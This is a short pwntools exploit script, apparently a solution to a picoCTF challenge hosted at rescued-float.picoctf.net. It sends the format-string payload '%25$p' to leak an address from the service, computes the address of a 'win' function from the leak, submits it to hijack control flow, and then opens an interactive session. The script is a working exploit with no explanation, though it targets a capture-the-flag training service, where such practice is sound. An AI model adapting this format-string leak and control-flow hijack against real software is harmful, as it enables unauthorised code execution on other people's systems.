from pwn import *

HOST, PORT = "rescued-float.picoctf.net", 64460
r = remote(HOST, PORT)
# r = process('./vuln')

r.recvuntil(b'name:')
r.sendline(b'%25$p')
main = r.recvline().decode().strip()
win = int(main, 16) - 0x96
r.recvuntil(b': ')
r.sendline(f'{hex(win)}'.encode())

r.interactive()

